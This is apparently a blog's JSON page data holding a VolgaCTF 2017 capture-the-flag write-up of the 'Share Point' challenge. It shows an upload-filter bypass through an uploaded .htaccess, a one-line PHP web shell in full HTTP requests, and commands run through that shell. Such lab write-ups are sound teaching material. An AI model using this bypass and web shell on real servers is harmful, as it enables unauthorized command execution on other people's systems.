{"data":{"markdownRemark":{"html":"<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Share Point\n\nLook! I wrote a good service for sharing your files with your friends, enjoy)\nshare-point.quals.2017.volgactf.ru</code></pre></div>\n<p>The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.</p>\n<p>Uploading files with a <code class=\"language-text\">.php</code> extension got rejected. I tried some tricks when trying to upload my <code class=\"language-text\">shell.php</code>:</p>\n<ul>\n<li>Chaning the Content Type to <code class=\"language-text\">image/jpeg</code>.</li>\n<li>Injecting null values in the filename <code class=\"language-text\">shell.php\\00.gif</code>.</li>\n<li>Uploading a file with the magic headers of a gif file.</li>\n</ul>\n<p>Next I tried to upload an <code class=\"language-text\">.htaccess</code> file with the following contents <code class=\"language-text\">AddType application/x-httpd-php .jpg</code>, this would cause <code class=\"language-text\">.jpg</code> files to executed as <code class=\"language-text\">.php</code> files, and it worked!</p>\n<p>The following code snippet shows the HTTP POST request from Burp Suite when uploading the <code class=\"language-text\">.htaccess</code> file and the following <code class=\"language-text\">shell.php.jpg</code>. </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">POST /upload.php HTTP/1.1\nHost: share-point.quals.2017.volgactf.ru\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: http://share-point.quals.2017.volgactf.ru/upload.php\nContent-Length: 271\nContent-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436\nCookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690\nConnection: close\n\n-----------------------------1620217569904038223723611436\nContent-Disposition: form-data; name=&quot;userFile&quot;; filename=&quot;.htaccess&quot;\nContent-Type: application/octet-stream\n\nAddType application/x-httpd-php .jpg\n\n-----------------------------1620217569904038223723611436--</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">POST /upload.php HTTP/1.1\nHost: share-point.quals.2017.volgactf.ru\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nReferer: http://share-point.quals.2017.volgactf.ru/upload.php\nContent-Length: 256\nContent-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984\nCookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690\nConnection: close\n\n-----------------------------5375118911646132755521388984\nContent-Disposition: form-data; name=&quot;userFile&quot;; filename=&quot;shell.php.jpg&quot;\nContent-Type: image/jpeg\n\n&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;\n\n-----------------------------5375118911646132755521388984--</code></pre></div>\n<p>Once we have uploaded the shell, we can start looking for the flag on the file system.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah\n\ntotal 24K\ndrwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .\ndrwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..\n-rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess\n-rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg</code></pre></div>\n<p>By pure luck I checked the <code class=\"language-text\">/opt/</code> folder and found <code class=\"language-text\">flag.txt</code>. Otherwise I would have simply searched for \"flag\".</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt\nVolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}</code></pre></div>","timeToRead":2,"excerpt":"The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability toâ€¦","frontmatter":{"title":"VolgaCTF - Share Point writeup","slug":"volgactf-share-point-writeup","date":"2017-03-28T00:00:00.000Z","categories":["CTF Writeup"],"tags":["CTF Writeup"],"template":"post"},"fields":{"nextTitle":"Chalmers CTF","nextSlug":"/chalmers-ctf/","prevTitle":"VolgaCTF - Bloody Feedback writeup","prevSlug":"/volgactf-bloody-feedback-writeup/","slug":"/volgactf-share-point-writeup/","date":"2017-03-28T00:00:00.000Z"}}},"pageContext":{"slug":"/volgactf-share-point-writeup/"}}